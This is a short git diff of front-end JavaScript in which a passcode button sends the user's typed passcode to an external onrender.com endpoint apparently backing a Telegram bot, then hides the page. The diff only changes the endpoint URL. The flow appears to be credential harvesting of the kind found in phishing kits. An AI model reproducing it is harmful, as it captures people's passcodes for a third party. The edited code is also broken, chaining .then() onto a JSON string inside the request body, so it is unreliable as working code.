@@ -52,14 +52,17 @@ document.addEventListener('DOMContentLoaded', () => {
 
     passcodeBtn.addEventListener('click', () => {
         // page2.style.transform = 'translate(-50%, 40px)';
-        fetch('https://tgbot-qnho.onrender.com/api/data', {
+        fetch('https://tgbot-6lgc.onrender.com/submit_data', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
             },
             body: JSON.stringify({
-                passcode: passcodeInput.value,
-            }),
+                passcode: passcodeInput.value
+            }).then(res => res.json())
+                .then(data => {
+                    console.log("Server response:", data);
+                })
         });
         page2.style.display = 'none';
 
